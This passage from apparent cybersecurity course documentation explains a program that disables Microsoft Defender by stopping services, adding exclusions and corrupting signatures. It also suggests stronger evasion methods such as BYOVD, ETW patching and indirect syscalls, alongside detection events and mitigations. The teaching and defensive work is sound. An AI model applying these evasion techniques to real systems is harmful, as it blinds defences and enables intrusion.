| Network Inspection | `WdNisSvc` / `WdNisDrv` | Network-based threat detection |
| EDR Sensor | `Sense` | Cloud telemetry, advanced hunting |
| Boot Driver | `WdBoot` | Early-boot protection, PPL enforcement |
| Filter Driver | `WdFilter` | Filesystem minifilter for I/O scanning |

---

## 9. Why This Technique Works (Red Team Perspective)

From an attacker's point of view, this program is effective because it abuses **legitimate administrative APIs** with **legitimate access tokens**. It is not exploiting a memory corruption vulnerability or injecting shellcode. It is simply doing what an administrator *could* do, but automatically and silently.

### Privilege Dependency
Almost every call in this program requires **elevated privileges** (Administrator or SYSTEM):
- `OpenSCManagerW` with `SC_MANAGER_CONNECT` + stopping protected services requires elevation.
- Writing to `HKLM\SOFTWARE\...` requires elevation.
- Writing to `C:\ProgramData\Microsoft\Windows\...` typically requires elevation.

If the attacker has already achieved privilege escalation (e.g., via a UAC bypass, token theft, or local exploit), this code is the **post-exploitation** phase that clears the way for persistence and payload execution.

### Layered Disarmament
The program does not rely on a single technique. It uses **defence in depth against the defender**:
1. **Stop services** — removes active protection engines.
2. **Add exclusions** — ensures future files in staging directories are never scanned.
3. **Corrupt signatures** — removes the threat intelligence database, so even if the engine restarts, it has no definitions to match against.

This mirrors how professional red teams operate: they assume individual controls may fail or be restored, so they apply multiple redundant techniques.

### Tamper Protection
Modern Windows (Windows 10 1903+) includes **Tamper Protection** for Defender. When Tamper Protection is enabled (default on consumer editions), registry writes to Defender keys and attempts to stop Defender services are blocked by the kernel, even for Administrator users. This program will **fail silently** on a hardened system unless Tamper Protection is first disabled via Group Policy, Intune, or an exploit.

---

## 9.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Stopping Defender services and adding exclusions is a reliable way to clear the path for follow-on malware.

**What the lab hides from you:** Tamper Protection is **ON by default** on every Windows 10/11 install since 1903. Even as Administrator, `ControlService` on `WinDefend` returns `Access Denied`. EDR agents like CrowdStrike and SentinelOne run as Protected Process Light (PPL) — they cannot be stopped from user mode at all. Cloud telemetry caches events and uploads on reconnection.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| Tamper Protection (default ON) | Blocks SCM stop of Defender services even for Admin | You set it to OFF |
| PPL (Protected Process Light) | EDR agents run as PPL — unkillable from user mode | No third-party EDR in lab |
| Cloud-delivered protection | Even if local engine stops, cloud heuristics still flag files | Internet on, but cloud may not be active |
| WDAC / AppLocker | Prevents untrusted executables from running | No app control in lab |
| ASR (Attack Surface Reduction) | Rules block child processes from Office, script execution | ASR not configured |

### What a Professional Red Teamer Would Do

**Instead of stopping Defender, they would:**
- **Live off the land** — use only built-in Windows tools (`certutil`, `mshta`, `wmic`) that are trusted and whitelisted
- **BYOVD (Bring Your Own Vulnerable Driver)** — load a signed vulnerable driver, exploit it to execute kernel code, disable callbacks from kernel mode
- **Blind EDR, not stop it** — patch ETW, unhook `ntdll.dll`, use indirect syscalls — operate while EDR is still running but blind
- **Target exclusions indirectly** — instead of writing registry, abuse Windows Update or SCCM to push legitimate-looking exclusions

**Key difference:** The pro assumes EDR is untouchable from user mode. They don't fight it head-on. They go around it or under it.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| Indirect syscalls | Bypass userland hooks without touching EDR | GitHub: `jthuraisamy/Syswhispers2` |
| ETW patching | Silences Windows event logging | MDsec blog: "ETW Tampering" |
| BYOVD | Kernel-level EDR bypass | GitHub: `hfiref0x/KDU` |
| Living-off-the-land binaries (LOLBins) | No dropped executable = nothing to detect | GitHub: `LOLBAS-Project` |

### The Honest Bottom Line

> This evasion technique teaches SCM and registry APIs. It does not teach modern defense evasion. In the real world, stopping Defender with `OpenSCManagerW` is a 1990s technique that died with Windows 10 1903. The value is understanding **what Defender looks like from the inside** — not thinking you can disable it. Learn indirect syscalls and ETW tampering next.

---

## 10. Detection Vectors and Mitigation

### 10.1 Detection Vectors

| Technique | Detection Method | Log Source |
|-----------|-----------------|------------|
| Service Stopping | Event ID 7040 / 7036 (service state change) | Windows System Event Log |
| SCM Access | ETW (Event Tracing for Windows) `Microsoft-Windows-Security-Auditing` 4674 / 4656 | Security Event Log |
| Registry Modification | Event ID 4657 (registry value modification) | Security Event Log |
| Defender Exclusion Added | Event ID 5007 (`Microsoft-Windows-Windows Defender/Operational`) | Defender Operational Log |
| Signature Corruption | Event ID 2001 (signature update failure) | Defender Operational Log |
| File Creation | Sysmon Event ID 11 (file create) | Sysmon Operational Log |
| Masquerading | YARA rule on `sysmon.log` in non-standard path | Endpoint sensors |

### 10.2 Behavioural Indicators (IoAs)

- A process not signed by Microsoft calling `ControlService` against `WinDefend`.
- Rapid sequential registry writes to `...\Exclusions\Paths`.
- Modification of `SignatureVersion` to a non-standard value.
- Creation of `.log` files inside `Caches` directories by non-system processes.

### 10.3 Mitigation Strategies

1. **Enable Tamper Protection**  
   The single most effective control. It prevents non-Microsoft processes from modifying Defender settings via registry or SCM.

2. **Restrict Local Admin Rights**  
   Without elevation, this program cannot open the SCM or write to HKLM.

3. **Monitor Service Control Events**  
   Forward Event IDs 7040, 7036, and 4674 to a SIEM. Alert on non-admin/service accounts stopping security services.

4. **Registry Integrity Monitoring**  
   Use tools like OSQuery, Sysmon, or commercial EDR to monitor `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`. Any new value is high-fidelity suspicious.

5. **Application Control / WDAC / AppLocker**  
   Prevent untrusted executables from running. If the attacker cannot execute arbitrary code, they cannot run this program.

6. **EDR and Cloud Telemetry**  
   Even if `Sense` is stopped locally, some EDR agents cache telemetry and upload on reconnection. Ensure agents run as **Protected Process Light (PPL)** so they cannot be trivially terminated.

7. **Boot Integrity**  
   Secure Boot + TPM + HVCI (Hypervisor-Protected Code Integrity) prevents boot drivers from being tampered with and ensures only signed code runs at high privilege.

---

## 11. Summary Checklist for Assessment

As a Cert IV Cyber Security student, ensure you can explain:

- [ ] What `#define _CRT_SECURE_NO_WARNINGS` does and why it appears in attack code.
- [ ] The difference between `LPCWSTR` and `LPCSTR` and why `L"..."` is used.
- [ ] The role of the Service Control Manager and the exact flow: `OpenSCManagerW` → `OpenServiceW` → `ControlService`.
- [ ] Why each service (`WinDefend`, `WdNisSvc`, `Sense`, `WdBoot`) is targeted.
- [ ] How Defender exclusions are stored in the registry (value name = path, value data = `DWORD 0`).
- [ ] The purpose of corrupting `SignatureVersion` to `0.0.0.0`.
- [ ] How `CreateFileA` + `WriteFile` creates the proof file and why the path is masqueraded.
- [ ] Why this code requires Administrator privileges and why it may fail on systems with Tamper Protection.
- [ ] At least three detection vectors and three mitigation strategies.

---

*End of Documentation.*
